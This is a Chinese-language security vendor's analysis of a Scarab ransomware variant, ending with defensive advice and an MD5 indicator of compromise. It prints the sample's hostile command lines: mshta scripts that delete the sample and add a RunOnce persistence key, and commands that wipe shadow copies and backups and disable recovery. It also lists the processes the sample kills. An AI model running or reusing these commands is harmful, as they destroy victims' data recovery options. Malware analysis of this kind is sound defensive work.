深信服EDR安全团队跟踪了Scarab勒索病毒的最新变种，该变种文件加密后缀为.hitler，有趣的是，希特勒对应的英文就是hitler，算是莫名躺枪了。

![图片.png](https://image.3001.net/images/20180914/1536915448_5b9b77f8218b0.png!small)  

通常，Scarab勒索病毒是利用Necurs僵尸网络进行传播的，Necurs是世界上最大的僵尸网络之一，曾用于传播多个恶意家族样本。最近一段时间，发现Scarab勒索病毒还会通过RDP爆破+人工、捆绑软件的方式进行传播。

下图，是此变种的勒索信息。

![图片.png](https://image.3001.net/images/20180914/1536915456_5b9b78002868b.png!small)

一、功能流程

此Scarab变种，其功能流程大致如下，依次分别为伪装录屏、屏幕快照、内存解密、设置启动、自删除、删除卷影、杀进程、遍历加密、勒索弹窗。

![图片.png](https://image.3001.net/images/20180914/1536915467_5b9b780b0a3fd.png!small)  

伪装录屏，是为了骗过安全软件，让其误以为是一个正常的录屏软件。此外，还截图了屏幕快照。与多数病毒一样，此勒索变种同样会设置启动，做持久化操作，也会做自删除的动作。为了保证数据不可恢复，同时也做了删除卷影的操作。

此外，此勒索病毒会杀掉多数的系统进程、应用进程、杀掉进程，最后遍历文件夹，做加密。所有的文件加密成功后，弹出勒索信息。

二、详细分析

1.查壳，母体样本使用的是UPX加壳，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915476_5b9b781448544.png!small)  

2.样本使用了详细的文件描述信息，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915485_5b9b781d20e2e.png!small)  

3.脱壳分析，动态调试，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915492_5b9b7824f3a74.png!small)  

4.录制音频，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915502_5b9b782e0568a.png!small)  
  

相应的反汇编代码，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915513_5b9b7839d14ea.png!small)  

5.创建窗口，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915525_5b9b78453e473.png!small)

6.获取操作系统语言版本，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915533_5b9b784d95bbc.png!small)

7.设置HOOK，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915541_5b9b7855aa3e1.png!small)

8.抓屏操作，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915551_5b9b785fae639.png!small)

9.启动子进程，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915560_5b9b7868d8f83.png!small)

10.进行持久化操作，拷贝自身到%appdata%目录下，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915568_5b9b7870cce2a.png!small)  

拷贝之后，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915577_5b9b7879abb84.png!small)  
然后启动%appdata%目录下的sevnz.exe程序，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915587_5b9b788309a0d.png!small)

11.解密内存相应的字符串，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915594_5b9b788a4d88c.png!small)  
通过执行mshta.exe，删除自身，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915603_5b9b7893ed123.png!small)  
相应的命令行，如下：

mshta.exe "javascript:o=new
ActiveXObject('Scripting.FileSystemObject');setInterval(function(){try{o.DeleteFile('Scarab.exe');close()}catch(e){}},10);"

12.调用mshta.exe程序，设置自启动项，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915614_5b9b789ecc552.png!small)  

相应的命令行，如下：

mshta.exe "javascript:o=new ActiveXObject('WScript.Shell');x=new
ActiveXObject('Scripting.FileSystemObject');setInterval(function(){try{i=x.GetFile('sevnz.exe').Path;o.RegWrite('HKCU\\\Software\\\Microsoft\\\Windows\\\CurrentVersion\\\RunOnce\\\iyryCNqPEUF',i);}catch(e){}},10);"

设置完成之后，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915624_5b9b78a816fda.png!small)  

13.通过mshta.exe设置相应的注册表项，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915632_5b9b78b021e84.png!small)  

将相应的删除系统备份，磁盘卷影操作的命令行，设置为注册表项，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915640_5b9b78b8ae2eb.png!small)  

通过mshta.exe执行命令，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915648_5b9b78c06891f.png!small)  

相应的命令行，如下：

o=new ActiveXObject("WScript.Shell");o.Run("cmd.exe /c wbadmin DELETE
SYSTEMSTATEBACKUP -keepVersions:0",0);o.Run("cmd.exe /c wmic SHADOWCOPY
DELETE",0);o.Run("cmd.exe /c vssadmin Delete Shadows /All
/Quiet",0);o.Run("cmd.ex

e /c bcdedit /set {default} recoveryenabled No",0);o.Run("cmd.exe /c bcdedit
/set {default} bootstatuspolicy ignoreallfailures",0);

14.遍历进程，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915658_5b9b78ca8f661.png!small)  

发现相关的进程，则结束进程，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915665_5b9b78d1ea024.png!small)  

相关进程列表如下：

ccleaner.exe;ccleaner64.exe;tasklist.exe;taskmgr.exe;regedit.exe;anvir.exe;anvir64.exe;cscript.exe;wscript.exe;powershell.exe;procexp.exe;far.exe;agntsvc.exe;agntsvc.exeagntsvc.exe;agntsvc.exeencsvc.exe;agntsvc.exeisqlplussvc.exe;dbeng50.exe;dbsnmp.exe;excel.exe;firefoxconfig.exe;infopath.exe;isqlplussvc.exe;msaccess.exe;msftesql.exe;mspub.exe;mydesktopqos.exe;mydesktopservice.exe;mysqld.exe;mysqld-nt.exe;mysqld-opt.exe;ncsvc.exe;ocautoupds.exe;ocomm.exe;ocssd.exe;onenote.exe;oracle.exe;outlook.exe;powerpnt.exe;sqbcoreservice.exe;sqlagent.exe;sqlbrowser.exe;sqlserver.exe;sqlservr.exe;sqlwriter.exe;steam.exe;synctime.exe;tbirdconfig.exe;thebat.exe;thebat64.exe;thunderbird.exe;visio.exe;winword.exe;wordpad.exe;xfssvccon.exe;

15.内存解密出相应的加密字符串，然后设置为注册表项，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915677_5b9b78dd6a225.png!small)

16.在内存中解密生成相应的勒索信息，用户的加密ID，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915686_5b9b78e69d87f.png!small)  

17.遍历文件，内存中加密相应的文件，文件名随机生成，文件后缀为hitler如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915697_5b9b78f108867.png!small)  

18.然后替换到原始的文件，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915705_5b9b78f9f185c.png!small)  

19.然后设置加密后的文件属性，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915713_5b9b7901abc50.png!small)

20.遍历文件的时候，会判断是否为加密文件列表中的后缀，相应的后缀列表有二百多种，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915721_5b9b7909c22ef.png!small)  

部分后缀名列表，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915731_5b9b79133bf0e.png!small)  

21.同时会遍历相应的文件目录，排除以下文件目录，相应的文件目录列表如下：

\$RECYCLE.BIN\;

\All Users\;

\AppData\;

\ApplicationData\;

\System Volume Information\;

\Windows\;

\intel\;

\nvidia\;

\Trend Micro\;

22.在加密文件的目录下，生成对应的勒索信息文本文件，然后将之前内存生成的勒索信息，写入到文件，如下所示：

![图片.png](https://image.3001.net/images/20180914/1536915742_5b9b791ea573d.png!small)

23.勒索信息文本文件HOW TO RECOVER ENCRYPTED
FILES.TXT，最后通过执行notepad.exe程序，弹出相应的勒索信息，执行的命令行如下：notepad.exe
"C:\Users\panda\HOW TO RECOVER ENCRYPTED FILES.TXT"

三、解决方案

提醒广大用户做好病毒检测与防御措施，防护勒索病毒攻击。

1、及时给电脑打补丁，修复漏洞。

2、对重要的数据文件定期进行非本地备份。

3、不要点击来源不明的邮件附件，不从不明网站下载软件。

4、尽量关闭不必要的文件共享权限。

5、更改帐号密码，设置强密码，避免使用统一的密码，因为统一的密码会导致一台被攻破，多台遭殃。

6、Scarab勒索病毒最新变种会利用RDP（远程桌面协议），如果业务上无需使用RDP的，建议关闭RDP。当出现此类事件时，推荐使用深信服防火墙，或者终端检测响应平台（EDR）的微隔离功能对3389等端口进行封堵，防止扩散！

7、深信服防火墙、终端检测响应平台（EDR）均有防爆破功能，防火墙开启此功能并启用11080051、11080027、11080016规则，EDR开启防爆破功能进行防御。

8、深信服安全感知平台（SIP）可对企业内网进行全网的安全态势感知，支持接入EDR、防火墙等众多安全产品，对安全可视，可协助用户提前预警安全威胁。

四、IOC

MD5

374F8ACCC92838939A6D3960AAB36AA0

